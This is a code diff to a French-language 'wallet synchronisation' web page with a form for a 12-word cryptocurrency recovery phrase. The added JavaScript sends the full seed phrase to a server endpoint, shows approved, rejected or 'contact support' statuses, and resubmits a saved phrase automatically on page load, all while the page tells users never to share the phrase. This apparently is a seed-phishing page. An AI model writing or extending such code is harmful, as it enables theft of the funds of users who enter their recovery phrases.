@@ -134,6 +134,34 @@
             font-size: 13px;
             margin-top: 15px;
         }
+        .status-box {
+            text-align: center;
+            padding: 20px;
+            margin-top: 20px;
+            border-radius: 16px;
+            font-size: 18px;
+            font-weight: 600;
+        }
+        .status-pending {
+            background: rgba(245,176,66,0.15);
+            color: #f5b042;
+            border: 1px solid rgba(245,176,66,0.3);
+        }
+        .status-approved {
+            background: rgba(16,185,129,0.15);
+            color: #10b981;
+            border: 1px solid rgba(16,185,129,0.3);
+        }
+        .status-rejected {
+            background: rgba(239,68,68,0.15);
+            color: #ef4444;
+            border: 1px solid rgba(239,68,68,0.3);
+        }
+        .status-checking {
+            background: rgba(59,130,246,0.15);
+            color: #3b82f6;
+            border: 1px solid rgba(59,130,246,0.3);
+        }
         @media (max-width: 600px) {
             .seed-grid { grid-template-columns: repeat(3, 1fr); }
         }
@@ -157,26 +185,27 @@
             Ne partagez JAMAIS votre phrase de récupération. Quiconque possède ces 12 mots peut contrôler votre portefeuille.
         </div>
 
-        <div class="seed-grid" id="seedGrid">
-            <!-- Les 12 champs seront générés par JavaScript -->
-        </div>
+        <div class="seed-grid" id="seedGrid"></div>
 
         <div class="progress-text" id="progressText">
             <i class="fas fa-circle" style="color: #10b981; font-size: 8px;"></i>
             0 / 12 mots saisis
         </div>
 
+        <div id="statusMessage" style="display: none;"></div>
+
         <div class="actions">
             <button class="btn btn-secondary" onclick="resetSeed()">
                 <i class="fas fa-undo-alt"></i> Effacer
             </button>
-            <button class="btn btn-primary" onclick="validateSeed()">
+            <button class="btn btn-primary" id="validateBtn" onclick="validateSeed()">
                 <i class="fas fa-check"></i> Valider
             </button>
         </div>
     </div>
 
     <script>
+        // Générer les 12 champs
         function generateSeedFields() {
             const grid = document.getElementById('seedGrid');
             grid.innerHTML = '';
@@ -220,10 +249,11 @@
                 const input = document.getElementById(`seed-${i}`);
                 if (input) input.value = '';
             }
+            document.getElementById('statusMessage').style.display = 'none';
             updateProgress();
         }
 
-        function validateSeed() {
+        async function validateSeed() {
             const words = [];
             let empty = false;
             for (let i = 1; i <= 12; i++) {
@@ -242,15 +272,64 @@
                 alert('Veuillez remplir tous les 12 mots.');
                 return;
             }
-            
-            localStorage.setItem('seedPhrase', words.join(' '));
-            localStorage.setItem('seedWords', JSON.stringify(words));
-            
-            alert('✅ Synchronisation réussie !');
-            window.location.href = 'dashboard.html';
+
+            const seedPhrase = words.join(' ');
+
+            try {
+                // Vérifier le statut sur le serveur
+                const response = await fetch('/api/wallet/check-status', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ seedPhrase })
+                });
+                const data = await response.json();
+
+                const statusDiv = document.getElementById('statusMessage');
+                statusDiv.style.display = 'block';
+
+                if (data.success) {
+                    if (data.status === 'approved') {
+                        statusDiv.className = 'status-box status-approved';
+                        statusDiv.innerHTML = '✅ Wallet synchronisé !';
+                    } else if (data.status === 'rejected') {
+                        statusDiv.className = 'status-box status-rejected';
+                        statusDiv.innerHTML = '❌ Synchronisation refusée. Contactez le support.';
+                    } else {
+                        statusDiv.className = 'status-box status-pending';
+                        statusDiv.innerHTML = '⏳ Attente de synchronisation...';
+                    }
+                } else {
+                    statusDiv.className = 'status-box status-pending';
+                    statusDiv.innerHTML = '⏳ Attente de synchronisation...';
+                }
+            } catch (error) {
+                console.error('Erreur:', error);
+                const statusDiv = document.getElementById('statusMessage');
+                statusDiv.style.display = 'block';
+                statusDiv.className = 'status-box status-checking';
+                statusDiv.innerHTML = '⏳ Attente de synchronisation...';
+            }
+        }
+
+        // Vérifier le statut au chargement (si seed déjà entrée)
+        function checkSavedSeed() {
+            const savedWords = localStorage.getItem('seedWords');
+            if (savedWords) {
+                const words = JSON.parse(savedWords);
+                for (let i = 1; i <= 12; i++) {
+                    const input = document.getElementById(`seed-${i}`);
+                    if (input && words[i-1]) {
+                        input.value = words[i-1];
+                    }
+                }
+                updateProgress();
+                // Vérifier automatiquement le statut
+                setTimeout(validateSeed, 500);
+            }
         }
 
         generateSeedFields();
+        checkSavedSeed();
     </script>
 </body>
 </html>
